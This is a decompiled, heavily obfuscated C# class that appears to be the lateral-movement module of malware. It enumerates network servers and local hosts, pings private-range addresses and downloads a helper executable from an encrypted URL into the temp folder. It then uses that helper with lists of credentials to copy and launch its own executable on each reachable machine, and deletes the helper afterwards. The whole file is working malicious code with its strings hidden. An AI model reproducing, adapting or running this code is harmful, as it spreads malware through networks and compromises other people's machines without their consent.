using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace ybfSLIGKlaODvJ;

internal sealed class NSmpMkfnjXaqzv
{
	public enum KdBXPtRhiaea
	{
		IEAxOQKTEBiPBzp = 1,
		PpgcUkvNcbhpzy,
		GrvfTTrpaupNLhg,
		gmoFmrEkerkQKk,
		WzUsnEdfuLcS
	}

	public enum nITKZzOJeILOR
	{
		kvqVsaRTIqS,
		dAmzHyMSco,
		eRgFSbBxnkPWIky,
		EOeUEYmeYiopIyP
	}

	public enum bAdiERJjoAjV
	{
		RGiMpdskHWYIDPu = 1,
		WGBFFMyqCZg = 2,
		dniYsrkwkAiMJBs = 4,
		mivPIiJsQVfz = 8,
		YshdvjCCcYL = 16,
		TvgbqVEajHnmh = 19
	}

	public enum RxWLKRlhyWtPAIEe
	{
		LFFvzNfIsFpS,
		ewETHcFzKnBcT,
		WSHuOBqAltKsx,
		ulyfTMFnSqNt,
		mFbdWaaWjxUKPn,
		NvYmVArIxwSiOox,
		XFiqdfMIyyNC,
		SUbtpZIQBcg,
		wrhMBfwVQXCdPX,
		mwDdFjkUtq,
		CxtotfGtLGczYJr,
		XAhsjGtdmiajoJQ
	}

	public sealed class MecpQLWHVuWSL : IEnumerable
	{
		private enum ceknbGfFLGPnnq
		{
			JiWaAmFTFV = 0,
			jQmyABvoTxJtS = 259
		}

		[StructLayout(LayoutKind.Sequential)]
		private sealed class BXMSKYnoErPU
		{
			public KdBXPtRhiaea GXaAtDUHwoFt;

			public nITKZzOJeILOR EKhxskdygLrF;

			public RxWLKRlhyWtPAIEe eRUdvtMUJFsH;

			public bAdiERJjoAjV ndQmAedMrt;

			public string gdfMTolqxZwWWHz;

			public string ADeKcgNjvrCvMOP;

			public string pknMwOtpAPHm;

			public string YpkThOvgwyGypFa;
		}

		private ArrayList WYBZYUUrQqrzOu = new ArrayList();

		[DllImport("Mpr.dll")]
		private static extern ceknbGfFLGPnnq WNetOpenEnumA(KdBXPtRhiaea dwScope, nITKZzOJeILOR dwType, bAdiERJjoAjV dwUsage, BXMSKYnoErPU p, out IntPtr lphEnum);

		[DllImport("Mpr.dll")]
		private static extern ceknbGfFLGPnnq WNetCloseEnum(IntPtr intptr_0);

		[DllImport("Mpr.dll")]
		private static extern ceknbGfFLGPnnq WNetEnumResourceA(IntPtr intptr_0, ref uint uint_0, IntPtr intptr_1, ref uint uint_1);

		private void EnumerateServers(BXMSKYnoErPU bxmskynoErPU_0, KdBXPtRhiaea kdBXPtRhiaea_0, nITKZzOJeILOR nITKZzOJeILOR_0, bAdiERJjoAjV bAdiERJjoAjV_0, RxWLKRlhyWtPAIEe rxWLKRlhyWtPAIEe_0)
		{
			uint uint_ = 16384u;
			IntPtr intPtr = Marshal.AllocHGlobal(16384);
			IntPtr lphEnum = IntPtr.Zero;
			uint uint_2 = 1u;
			if (WNetOpenEnumA(kdBXPtRhiaea_0, nITKZzOJeILOR_0, bAdiERJjoAjV_0, bxmskynoErPU_0, out lphEnum) == ceknbGfFLGPnnq.JiWaAmFTFV)
			{
				ceknbGfFLGPnnq ceknbGfFLGPnnq;
				do
				{
					ceknbGfFLGPnnq = WNetEnumResourceA(lphEnum, ref uint_2, intPtr, ref uint_);
					switch (ceknbGfFLGPnnq)
					{
					case ceknbGfFLGPnnq.jQmyABvoTxJtS:
						continue;
					case ceknbGfFLGPnnq.JiWaAmFTFV:
						Marshal.PtrToStructure(intPtr, bxmskynoErPU_0);
						if (bxmskynoErPU_0.eRUdvtMUJFsH == rxWLKRlhyWtPAIEe_0)
						{
							WYBZYUUrQqrzOu.Add(bxmskynoErPU_0.ADeKcgNjvrCvMOP);
						}
						if ((bxmskynoErPU_0.ndQmAedMrt & bAdiERJjoAjV.WGBFFMyqCZg) == bAdiERJjoAjV.WGBFFMyqCZg)
						{
							EnumerateServers(bxmskynoErPU_0, kdBXPtRhiaea_0, nITKZzOJeILOR_0, bAdiERJjoAjV_0, rxWLKRlhyWtPAIEe_0);
						}
						continue;
					}
					break;
				}
				while (ceknbGfFLGPnnq != ceknbGfFLGPnnq.jQmyABvoTxJtS);
				WNetCloseEnum(lphEnum);
			}
			Marshal.FreeHGlobal(intPtr);
		}

		public MecpQLWHVuWSL(KdBXPtRhiaea kdBXPtRhiaea_0, nITKZzOJeILOR nITKZzOJeILOR_0, bAdiERJjoAjV bAdiERJjoAjV_0, RxWLKRlhyWtPAIEe rxWLKRlhyWtPAIEe_0)
		{
			BXMSKYnoErPU bxmskynoErPU_ = new BXMSKYnoErPU();
			EnumerateServers(bxmskynoErPU_, kdBXPtRhiaea_0, nITKZzOJeILOR_0, bAdiERJjoAjV_0, rxWLKRlhyWtPAIEe_0);
		}

		public IEnumerator GetEnumerator()
		{
			return WYBZYUUrQqrzOu.GetEnumerator();
		}
	}

	private sealed class FcAGyqeawnE
	{
		public string ZyWMDJzJEshqk;

		public string eMnxicwwbShSX;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CRun_003Eb__d(string string_0)
		{
			if ((!string_0.StartsWith(getString_0(107386280)) && !string_0.StartsWith(getString_0(107386275)) && !string_0.StartsWith(getString_0(107386234)) && !string_0.Contains(getString_0(107390167))) || !NfTlqbseztXcZ(string_0))
			{
				return;
			}
			if (iWNOuKBWgwsf.mOZlcUdlpNwiQK == getString_0(107396949))
			{
				for (int i = 0; i < sfDFVKKNNXZycOA.Count; i++)
				{
					if (iWNOuKBWgwsf.NInXLtDmFUW)
					{
						if (File.Exists(ZyWMDJzJEshqk))
						{
							iWNOuKBWgwsf.iDwobxXLVYBDUs(ZyWMDJzJEshqk, getString_0(107389477) + string_0 + getString_0(107403228) + sfDFVKKNNXZycOA[i] + getString_0(107403219) + qaHzallUwIN[i] + getString_0(107403242) + Assembly.GetEntryAssembly()!.Location + getString_0(107389431));
						}
					}
					else if (File.Exists(eMnxicwwbShSX))
					{
						iWNOuKBWgwsf.iDwobxXLVYBDUs(eMnxicwwbShSX, getString_0(107389477) + string_0 + getString_0(107403228) + sfDFVKKNNXZycOA[i] + getString_0(107403219) + qaHzallUwIN[i] + getString_0(107402697) + Assembly.GetEntryAssembly()!.Location + getString_0(107389431));
					}
				}
			}
			else if (iWNOuKBWgwsf.NInXLtDmFUW)
			{
				if (File.Exists(ZyWMDJzJEshqk))
				{
					iWNOuKBWgwsf.iDwobxXLVYBDUs(ZyWMDJzJEshqk, getString_0(107389477) + string_0 + getString_0(107402608) + Assembly.GetEntryAssembly()!.Location + getString_0(107389431));
				}
			}
			else if (File.Exists(eMnxicwwbShSX))
			{
				iWNOuKBWgwsf.iDwobxXLVYBDUs(eMnxicwwbShSX, getString_0(107389477) + string_0 + getString_0(107402575) + Assembly.GetEntryAssembly()!.Location + getString_0(107389431));
			}
		}

		static FcAGyqeawnE()
		{
			Strings.CreateGetStringDelegate(typeof(FcAGyqeawnE));
		}
	}

	public static List<string> iRFOvoVZHrDV;

	public static string ZKjfQeoiwMErgvZV;

	public static List<string> sfDFVKKNNXZycOA;

	public static List<string> qaHzallUwIN;

	public static List<string> EGcbaRLOexSDugx;

	public List<string> ZJuMgkqcHhjlw = new List<string>();

	public List<string> FDQsLMoUVlNqf = new List<string>();

	public List<string> rYUMkBMtDJEbek = new List<string>();

	[NonSerialized]
	internal static GetString getString_0;

	public static void QsBuVxHMqOHh()
	{
		FcAGyqeawnE CS_0024_003C_003E8__locals0 = new FcAGyqeawnE();
		iWNOuKBWgwsf.GPKTahFPqhtkDc();
		List<fQEsAhoqVjVt> list = fQEsAhoqVjVt.EZAGitnIbFK();
		foreach (fQEsAhoqVjVt item in list)
		{
			iRFOvoVZHrDV.Add(item.IPAddress);
		}
		if (iWNOuKBWgwsf.VctgEKcOffY.Count > 0)
		{
			iRFOvoVZHrDV = iRFOvoVZHrDV.Union(iWNOuKBWgwsf.VctgEKcOffY).ToList();
		}
		CS_0024_003C_003E8__locals0.ZyWMDJzJEshqk = getString_0(107390121);
		CS_0024_003C_003E8__locals0.eMnxicwwbShSX = getString_0(107390121);
		try
		{
			CS_0024_003C_003E8__locals0.ZyWMDJzJEshqk = oIqaiNQDXsBH();
		}
		catch
		{
		}
		try
		{
			CS_0024_003C_003E8__locals0.eMnxicwwbShSX = oTffXovoEzu();
		}
		catch
		{
		}
		foreach (fQEsAhoqVjVt item2 in list)
		{
			try
			{
				if (item2.IPAddress.StartsWith(getString_0(107386234)) || item2.IPAddress.StartsWith(getString_0(107386229)) || item2.IPAddress.StartsWith(getString_0(107386188)) || item2.IPAddress.Contains(getString_0(107390121)))
				{
					DzrcIlUcDMF.qJwGkyVsumYo(item2.MacAddress, item2.IPAddress, getString_0(107402968));
				}
			}
			catch
			{
			}
		}
		try
		{
			Parallel.ForEach(iRFOvoVZHrDV, delegate(string string_0)
			{
				if ((string_0.StartsWith(FcAGyqeawnE.getString_0(107386280)) || string_0.StartsWith(FcAGyqeawnE.getString_0(107386275)) || string_0.StartsWith(FcAGyqeawnE.getString_0(107386234)) || string_0.Contains(FcAGyqeawnE.getString_0(107390167))) && NfTlqbseztXcZ(string_0))
				{
					if (iWNOuKBWgwsf.mOZlcUdlpNwiQK == FcAGyqeawnE.getString_0(107396949))
					{
						for (int i = 0; i < sfDFVKKNNXZycOA.Count; i++)
						{
							if (iWNOuKBWgwsf.NInXLtDmFUW)
							{
								if (File.Exists(CS_0024_003C_003E8__locals0.ZyWMDJzJEshqk))
								{
									iWNOuKBWgwsf.iDwobxXLVYBDUs(CS_0024_003C_003E8__locals0.ZyWMDJzJEshqk, FcAGyqeawnE.getString_0(107389477) + string_0 + FcAGyqeawnE.getString_0(107403228) + sfDFVKKNNXZycOA[i] + FcAGyqeawnE.getString_0(107403219) + qaHzallUwIN[i] + FcAGyqeawnE.getString_0(107403242) + Assembly.GetEntryAssembly()!.Location + FcAGyqeawnE.getString_0(107389431));
								}
							}
							else if (File.Exists(CS_0024_003C_003E8__locals0.eMnxicwwbShSX))
							{
								iWNOuKBWgwsf.iDwobxXLVYBDUs(CS_0024_003C_003E8__locals0.eMnxicwwbShSX, FcAGyqeawnE.getString_0(107389477) + string_0 + FcAGyqeawnE.getString_0(107403228) + sfDFVKKNNXZycOA[i] + FcAGyqeawnE.getString_0(107403219) + qaHzallUwIN[i] + FcAGyqeawnE.getString_0(107402697) + Assembly.GetEntryAssembly()!.Location + FcAGyqeawnE.getString_0(107389431));
							}
						}
					}
					else if (iWNOuKBWgwsf.NInXLtDmFUW)
					{
						if (File.Exists(CS_0024_003C_003E8__locals0.ZyWMDJzJEshqk))
						{
							iWNOuKBWgwsf.iDwobxXLVYBDUs(CS_0024_003C_003E8__locals0.ZyWMDJzJEshqk, FcAGyqeawnE.getString_0(107389477) + string_0 + FcAGyqeawnE.getString_0(107402608) + Assembly.GetEntryAssembly()!.Location + FcAGyqeawnE.getString_0(107389431));
						}
					}
					else if (File.Exists(CS_0024_003C_003E8__locals0.eMnxicwwbShSX))
					{
						iWNOuKBWgwsf.iDwobxXLVYBDUs(CS_0024_003C_003E8__locals0.eMnxicwwbShSX, FcAGyqeawnE.getString_0(107389477) + string_0 + FcAGyqeawnE.getString_0(107402575) + Assembly.GetEntryAssembly()!.Location + FcAGyqeawnE.getString_0(107389431));
					}
				}
			});
		}
		catch
		{
			return;
		}
		try
		{
			if (File.Exists(CS_0024_003C_003E8__locals0.ZyWMDJzJEshqk))
			{
				File.Delete(CS_0024_003C_003E8__locals0.ZyWMDJzJEshqk);
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (File.Exists(CS_0024_003C_003E8__locals0.eMnxicwwbShSX))
			{
				File.Delete(CS_0024_003C_003E8__locals0.eMnxicwwbShSX);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string oIqaiNQDXsBH()
	{
		if (IntPtr.Size == 8)
		{
			return YyFssUHMXwt(new Uri(iWNOuKBWgwsf.HnrHiFTDAEzVb(getString_0(107402915))));
		}
		return YyFssUHMXwt(new Uri(iWNOuKBWgwsf.HnrHiFTDAEzVb(getString_0(107402915))));
	}

	public static string oTffXovoEzu()
	{
		if (IntPtr.Size == 8)
		{
			return YyFssUHMXwt(new Uri(iWNOuKBWgwsf.HnrHiFTDAEzVb(getString_0(107403378))));
		}
		return YyFssUHMXwt(new Uri(iWNOuKBWgwsf.HnrHiFTDAEzVb(getString_0(107403269))));
	}

	public static bool NfTlqbseztXcZ(string string_0)
	{
		bool result = false;
		Ping ping = null;
		try
		{
			using (ping = new Ping())
			{
				PingReply pingReply = ping.Send(string_0);
				result = pingReply.Status == IPStatus.Success;
				return result;
			}
		}
		catch (PingException)
		{
			return result;
		}
		finally
		{
			ping?.Dispose();
		}
	}

	public static string YyFssUHMXwt(Uri uri_0)
	{
		string path = Path.GetRandomFileName().Replace(getString_0(107403228), getString_0(107390121)).Remove(0, 3) + getString_0(107403223);
		WebClient webClient = new WebClient();
		webClient.DownloadFile(uri_0, Path.Combine(Path.GetTempPath(), path));
		return Path.Combine(Path.GetTempPath(), path);
	}

	static NSmpMkfnjXaqzv()
	{
		Strings.CreateGetStringDelegate(typeof(NSmpMkfnjXaqzv));
		iRFOvoVZHrDV = new List<string>();
		ZKjfQeoiwMErgvZV = getString_0(107390121);
		sfDFVKKNNXZycOA = new List<string>();
		qaHzallUwIN = new List<string>();
		EGcbaRLOexSDugx = new List<string>();
	}
}
